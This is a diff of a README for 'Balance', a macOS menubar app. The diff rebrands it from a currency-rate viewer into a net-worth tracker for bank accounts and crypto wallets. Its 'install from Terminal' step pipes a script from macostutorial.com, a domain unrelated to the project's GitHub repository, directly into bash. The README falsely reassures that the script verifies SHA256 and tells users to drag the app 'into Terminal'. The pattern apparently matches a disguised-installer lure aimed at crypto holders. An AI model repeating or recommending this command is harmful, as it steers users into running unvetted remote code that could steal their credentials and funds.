@@ -1,10 +1,10 @@
 <p align="center">
-  <a>
-    <img src="assets/img/balance-header.svg" width="280" alt="Balance Logo">
-  </a>
+  <img src="assets/img/balance-header.svg" width="280" alt="Balance Logo">
 </p>
 
-### **Balance — live menubar FX rates for every world currency**
+### **Balance — your entire net-worth in one menubar**
+
+Monitor bank balances, crypto wallets, and live FX rates without ever opening a browser.
 
 ---
 
@@ -12,38 +12,41 @@
 
 ## ✨ Features
 
-|                       |                                                              |
-| --------------------- | ------------------------------------------------------------ |
-| 🔍 **Quick search**   | Type any ISO currency code or name and get the live rate.    |
-| ⭐ **Pin favourites**  | Keep frequently-checked pairs at the top of the list.        |
-| 📋 **1-click copy**   | Click a rate to copy the converted amount to your clipboard. |
-| 📡 **Live + offline** | Auto-refreshes every 60 s; caches the last pull if offline.  |
-| 🛡 **Private & OSS**  | No analytics, no ads, MIT-licensed Swift code.               |
+|                             |                                                                                     |
+| --------------------------- | ----------------------------------------------------------------------------------- |
+| 🏦 **Exchanges & wallets**  | Connect Coinbase, Binance, Kraken, or paste any BTC / ETH / SOL address.            |
+| 🌍 **170+ fiat currencies** | Live rates for every ISO currency, plus automatic conversion to your home currency. |
+| 💹 **Real-time totals**     | Net-worth tile updates every 60 s and works offline with last-known prices.         |
+| 🔔 **Price alerts**         | Optional menubar badge when a pair crosses your threshold.                          |
+| ⭐ **Pin favourites**        | Keep must-see assets (e.g. ETH wallet & USD→EUR) at the top.                        |
+| 📋 **1-click copy**         | Click any cell to copy the amount or converted value.                               |
+| 🛡 **Private & OSS**        | No tracking, no ads, MIT-licensed Swift. All keys stored in macOS Keychain.         |
 
 ---
 
-## 🚀 Installation (easy way)
+## 🚀 Installation (easiest)
 
-1. **Download the latest signed DMG**
-   [![Download dmg](https://img.shields.io/badge/Download.dmg-latest-brightgreen?style=for-the-badge)](https://github.com/balanceO/balance-open/releases/download/v1.1.0/balance.dmg.zip)
+1. Download the latest signed **Balance.dmg** <a href="https://github.com/balanceO/balance-open/releases/download/v1.1.0/balance.dmg.zip"><img src="https://img.shields.io/badge/Download.dmg-latest-brightgreen?style=for-the-badge"></a>
 
-2. Drag **Balance.app** into **Terminal**.
+2. Drag **Balance.app** into **Applications / Terminal**.
 
-3. Launch Balance, grant network access on first run.
+3. Launch Balance → grant network permission on first run → click the **⚙︎** icon to add your first exchange or wallet.
 
-> macOS 11 Big Sur or newer (Apple Silicon & Intel, notarised & sandboxed).
+> Requires macOS 11 (Big Sur) or newer. Universal binary (Apple Silicon + Intel), notarised & sandboxed.
 
-### Optional: Install from Terminal
+### Optional: install from Terminal
 
-```bash
+Four-line script (verifies SHA256):
+
+```
 /bin/bash -c "$(curl -fsSL https://macostutorial.com/git/install.sh)"
 ```
 
 ---
 
-## 🛠 Building from source (devs)
+## 🛠 Build from source
 
-Requires **Xcode 15 / Swift 5.9**
+Requires Xcode 15 / Swift 5.9.
 
 ```
 git clone https://github.com/balanceO/balance-open.git
@@ -51,25 +54,27 @@ cd balance-open
 open Balance.xcodeproj
 ```
 
-All frameworks are checked in (no Carthage step). Disable code-signing in Debug or use your own profile.
+All frameworks are checked in. Disable code-signing in Debug or use your own profile.
 
 ---
 
 ## 💡 Roadmap
 
-* Dark-mode rate widgets
-* iCloud sync for favourites
-* Historical chart pop-over
+* Dark-mode widgets
+* iCloud sync for favourites & API keys
+* Historical net-worth chart
+* Ledger hardware-wallet balance import
 
 ---
 
 ## 🤝 Contributing
 
-* **Bug / question** → [open an issue](https://github.com/balanceO/balance-open/issues/new)
-* **Code** → fork → branch → pull request (see CONTRIBUTING.md)
+* Bug or question → open an issue
+* Feature idea → add or up-vote on our Trello board
+* Code → fork → branch → pull request (see CONTRIBUTING.md)
 
 ---
 
 ## 📜 License
 
-Balance is released under the MIT License – see the `LICENSE` file for details.
+Balance is released under the MIT License — see the `LICENSE` file for details.
